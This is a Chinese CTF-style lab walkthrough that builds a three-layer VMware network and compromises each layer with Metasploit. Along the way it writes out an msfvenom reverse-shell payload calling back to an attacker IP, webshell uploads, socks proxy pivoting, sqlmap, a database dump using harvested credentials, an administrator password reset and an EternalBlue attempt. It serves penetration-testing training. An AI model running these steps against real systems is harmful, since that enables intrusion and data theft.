> 原文链接: https://www.anquanke.com//post/id/170649 


# 三层网络靶场搭建&amp;MSF内网渗透


                                阅读量   
                                **775262**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">26</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t0156a9666ab32c52db.jpg)](https://p0.ssl.qhimg.com/t0156a9666ab32c52db.jpg)



在最近的CTF比赛中，综合靶场出现的次数越来越多，这种形式的靶场和真实的内网渗透很像，很贴合实际工作，但我们往往缺少多层网络的练习环境。本文通过VMware搭建3层网络，并通过msf进行内网渗透，涉及代理搭建，流量转发，端口映射等常见内网渗透技术。



## 网络拓扑

[![](https://p2.ssl.qhimg.com/t013d94586aaa79f7a9.png)](https://p2.ssl.qhimg.com/t013d94586aaa79f7a9.png)



## 环境搭建

首先在虚拟机中新建3块网卡，选择仅主机模式

[![](https://p3.ssl.qhimg.com/t01b44e824660982b44.png)](https://p3.ssl.qhimg.com/t01b44e824660982b44.png)

将kali设为第一层网络vmnet1

[![](https://p2.ssl.qhimg.com/t014e45275e4b7b9c2d.png)](https://p2.ssl.qhimg.com/t014e45275e4b7b9c2d.png)

将第一层靶机设为双网卡vmnet1和vmnet2

[![](https://p2.ssl.qhimg.com/t0183e3658461a4b2df.png)](https://p2.ssl.qhimg.com/t0183e3658461a4b2df.png)

[![](https://p3.ssl.qhimg.com/t0193d5d17bebae3852.png)](https://p3.ssl.qhimg.com/t0193d5d17bebae3852.png)

将第二层靶机设置为双网卡：vmnet2和vmnet3：

[![](https://p3.ssl.qhimg.com/t017cc0e3cbefeea27a.png)](https://p3.ssl.qhimg.com/t017cc0e3cbefeea27a.png)

[![](https://p0.ssl.qhimg.com/t014079b285cd44f1d0.png)](https://p0.ssl.qhimg.com/t014079b285cd44f1d0.png)

将第三层靶机设为vmnet3：

[![](https://p0.ssl.qhimg.com/t01e93368b806fcad95.png)](https://p0.ssl.qhimg.com/t01e93368b806fcad95.png)

至此，我们的3层网络环境就已经搭建完毕。



## 第一层靶机

Nmap探测一下，发现8080端口：

[![](https://p1.ssl.qhimg.com/t01b4de35dbe1f6c1b0.png)](https://p1.ssl.qhimg.com/t01b4de35dbe1f6c1b0.png)

访问一下：

[![](https://p0.ssl.qhimg.com/t0193f82e4d6c59025b.png)](https://p0.ssl.qhimg.com/t0193f82e4d6c59025b.png)

返现文件上传点，经测试没有任何过滤，可以直接上传任意文件，因此直接上传jsp一句话后门：

[![](https://p4.ssl.qhimg.com/t016522dac96fe6288c.png)](https://p4.ssl.qhimg.com/t016522dac96fe6288c.png)

上传后返回文件路径，菜刀连接：

[![](https://p3.ssl.qhimg.com/t01cb6d7bd25def42ef.png)](https://p3.ssl.qhimg.com/t01cb6d7bd25def42ef.png)

为了进一步做内网渗透，上传msf后门：

1、后门制作：

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.59.128 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt;shell.elf`

将shell.elf上传到第一层靶机192.168.59.129

2、MSF设置监听：

[![](https://p5.ssl.qhimg.com/t0177ef4ba9f3d1a389.png)](https://p5.ssl.qhimg.com/t0177ef4ba9f3d1a389.png)

3、在第一层靶机运行shell.elf

`Chmod 777 shell.elf`<br>`./shell.elf`

4、Msf获得meterpreter，执行shell，查看网络配置，发现双网卡，第二层网络段为192.168.80.0/24

[![](https://p1.ssl.qhimg.com/t011e224aabe3459c50.png)](https://p1.ssl.qhimg.com/t011e224aabe3459c50.png)



## 第二层靶机

首先利用第一层的meterpreter添加到第二层的路由：

`run autoroute -s 192.168.80.0/24`

[![](https://p3.ssl.qhimg.com/t01a8621e8bc3bc7eaf.png)](https://p3.ssl.qhimg.com/t01a8621e8bc3bc7eaf.png)

然后利用msf进行第二层网络存活主机扫描：

`use auxiliary/scanner/discovery/arp_sweep`

[![](https://p3.ssl.qhimg.com/t010e7c939bbd77b93b.png)](https://p3.ssl.qhimg.com/t010e7c939bbd77b93b.png)

发现第二层靶机 192.168.80.129。

接着利用msf搭建socks代理，好让攻击机直接打第二层网络：

`use auxiliary/server/socks4a`

[![](https://p4.ssl.qhimg.com/t0193c8f349af37dd93.png)](https://p4.ssl.qhimg.com/t0193c8f349af37dd93.png)

然后在第一层网络配置相关socks4代理客户端：

Proxychain:

在配置文件/etc/proxychains.conf中添加：

socks4 192.168.59.128 9999

然后利用proxychans 启动nmap对第二层靶机进行扫描，这里注意一定要加上-Pn和-sT参数：

`proxychains nmap -Pn -sT 192.168.80.129 -p1-1000`

[![](https://p3.ssl.qhimg.com/t01aa4687434203209c.png)](https://p3.ssl.qhimg.com/t01aa4687434203209c.png)

发现第二层主机开放22和80端口。

在Chrome中配置代理

[![](https://p1.ssl.qhimg.com/t0149e129f688984b42.png)](https://p1.ssl.qhimg.com/t0149e129f688984b42.png)

访问第二层网络：

[![](https://p0.ssl.qhimg.com/t010e3557a72a464c42.png)](https://p0.ssl.qhimg.com/t010e3557a72a464c42.png)

是一个typecho的 cms，尝试admin/admin等弱口令登陆后台，登陆成功：

[![](https://p4.ssl.qhimg.com/t01b7d70ea5baa5081e.png)](https://p4.ssl.qhimg.com/t01b7d70ea5baa5081e.png)

个人信息处发现flag：

[![](https://p0.ssl.qhimg.com/t0112451037ed07d3d1.png)](https://p0.ssl.qhimg.com/t0112451037ed07d3d1.png)

在设置中允许上传php

[![](https://p1.ssl.qhimg.com/t01b8c071f803f04353.png)](https://p1.ssl.qhimg.com/t01b8c071f803f04353.png)

然后撰写文章，附件上传php webshell：

[![](https://p1.ssl.qhimg.com/t0166d548d7e0534e8d.png)](https://p1.ssl.qhimg.com/t0166d548d7e0534e8d.png)

可以看到shell路径，用蚁剑连接，因为是第二层网络，所以得通过socks代理客户端去启动蚁剑，我用的是sockscap64：

[![](https://p5.ssl.qhimg.com/t013c47093e073cb0a9.png)](https://p5.ssl.qhimg.com/t013c47093e073cb0a9.png)

在代理中配置代理服务器：

[![](https://p0.ssl.qhimg.com/t01380e0165d18ad85a.png)](https://p0.ssl.qhimg.com/t01380e0165d18ad85a.png)

用蚁剑连接shell：

[![](https://p2.ssl.qhimg.com/t011f496458f8dc9bbd.png)](https://p2.ssl.qhimg.com/t011f496458f8dc9bbd.png)

在网站根目录处发现flag

查看config.inc.php:

[![](https://p1.ssl.qhimg.com/t011d5fbb9be269a5c9.png)](https://p1.ssl.qhimg.com/t011d5fbb9be269a5c9.png)

发现数据库口令123：

将数据库dump出来：

`mysqldump -uroot -p123 typecho &gt;/tmp/1.sql`

在1.sql中发现flag：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014427bfbbfab80807.png)

第二层靶机还开放了22端口，尝试利用msf、hydra探测一下弱口令：

Hydra：

[![](https://p0.ssl.qhimg.com/t015ab86ccdfe44b410.png)](https://p0.ssl.qhimg.com/t015ab86ccdfe44b410.png)

Msf：

`use auxiliary/scanner/ssh/ssh_login`

[![](https://p5.ssl.qhimg.com/t0115c95b3c712a2c5c.png)](https://p5.ssl.qhimg.com/t0115c95b3c712a2c5c.png)

[![](https://p1.ssl.qhimg.com/t016a5a4cd9409a16ac.png)](https://p1.ssl.qhimg.com/t016a5a4cd9409a16ac.png)

同样发现弱口令，同时msf可以直接获得一个meterpreter

[![](https://p3.ssl.qhimg.com/t01882e8864a3788770.png)](https://p3.ssl.qhimg.com/t01882e8864a3788770.png)

获得flag:

[![](https://p2.ssl.qhimg.com/t012f353629748251e2.png)](https://p2.ssl.qhimg.com/t012f353629748251e2.png)

在sockscap64中打开ssh客户端：

[![](https://p4.ssl.qhimg.com/t01630b0232221cf80c.png)](https://p4.ssl.qhimg.com/t01630b0232221cf80c.png)

也可以利用root/123456登录，获得flag

[![](https://p5.ssl.qhimg.com/t01ab7abe5abf8cc5ed.png)](https://p5.ssl.qhimg.com/t01ab7abe5abf8cc5ed.png)

同样，为了打进第三层，我们需要在第二层靶机上上传msf后门，

制作后门：

`msfvenom  -p linux/x86/meterpreter/bind_tcp  LPORT=4321  -f elf &gt; shell1.elf`

利用蚁剑上传，并在第二层靶机运行：

`Chmod 777 ./shell1.elf`<br>`./shell1.elf`

在msf上配置payload：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01db7a5486b85c4d17.png)

获得第二层meterpreter：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016451669d012dd905.png)

发现第三层网段192.168.226.0/24

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01fa64ad96900b9e08.png)

然后利用这个meterpreter添加到第三层的网络路由：

`run autoroute -s 192.168.226.0/24`

[![](https://p2.ssl.qhimg.com/t014e3c7069b989b3d3.png)](https://p2.ssl.qhimg.com/t014e3c7069b989b3d3.png)

在启用一个socks代理给第三层网络，端口开9998

[![](https://p5.ssl.qhimg.com/t01635a2ba9d564032e.png)](https://p5.ssl.qhimg.com/t01635a2ba9d564032e.png)

然后在proxychains的配置文件中加上9998：

[![](https://p3.ssl.qhimg.com/t01e91c514ba18f8687.png)](https://p3.ssl.qhimg.com/t01e91c514ba18f8687.png)

扫描一下第三层主机端口：

`proxychains nmap -Pn -sT 192.168.226.129 -p1-1000`

[![](https://p3.ssl.qhimg.com/t0183ae75fc04774543.png)](https://p3.ssl.qhimg.com/t0183ae75fc04774543.png)

发现开放了80、445端口



## 第三层网络

在chrome 修改代理，端口改为9998

[![](https://p1.ssl.qhimg.com/t014ff3aaa9d27d6cd3.png)](https://p1.ssl.qhimg.com/t014ff3aaa9d27d6cd3.png)

访问第三层网络

[![](https://p5.ssl.qhimg.com/t0194f1a58b08652b9d.png)](https://p5.ssl.qhimg.com/t0194f1a58b08652b9d.png)

查询处存在SQL注入

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t012388f55f2d0c275c.png)

抓包：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01b4a4f158db9fc14a.png)

Proxychains 跑sqlmap

`proxychains sqlmap -r test.txt`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01232d19d7f5a0d76e.png)

得到后台用户密码：admin/faka123

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013c4be06509e0e26a.png)

登录：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ef61b08cbb5f7af4.png)

发现flag。接着在logo上传处发现任意文件上传：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b0c942dffc36082b.png)

直接上传木马，获得路径：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01318563197adda4bb.png)

菜刀连接，网站根目录发现flag

[![](https://p5.ssl.qhimg.com/t018319371b7503eb54.png)](https://p5.ssl.qhimg.com/t018319371b7503eb54.png)

发现网站开启了3389，同时是system权限：

[![](https://p5.ssl.qhimg.com/t01a803264e2add6522.png)](https://p5.ssl.qhimg.com/t01a803264e2add6522.png)

[![](https://p1.ssl.qhimg.com/t0100cebbe229bbc42f.png)](https://p1.ssl.qhimg.com/t0100cebbe229bbc42f.png)

直接修改administrator密码：

`net user administrator 123456`

再把第三层3389流量转发到代理服务器中：

[![](https://p1.ssl.qhimg.com/t01ccdc900eff325fed.png)](https://p1.ssl.qhimg.com/t01ccdc900eff325fed.png)

访问远程桌面：

[![](https://p3.ssl.qhimg.com/t01169a54923f24c444.png)](https://p3.ssl.qhimg.com/t01169a54923f24c444.png)

发现flag：

[![](https://p1.ssl.qhimg.com/t018ec3e67fe3863755.png)](https://p1.ssl.qhimg.com/t018ec3e67fe3863755.png)

同时，该靶机开放445端口，试试永痕之蓝：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010387f998c2986227.png)

[![](https://p3.ssl.qhimg.com/t01b2ce829c00dde2ee.png)](https://p3.ssl.qhimg.com/t01b2ce829c00dde2ee.png)

同样可以拿到shell。

至此，我们已经拿下3层网络中的全部机器。
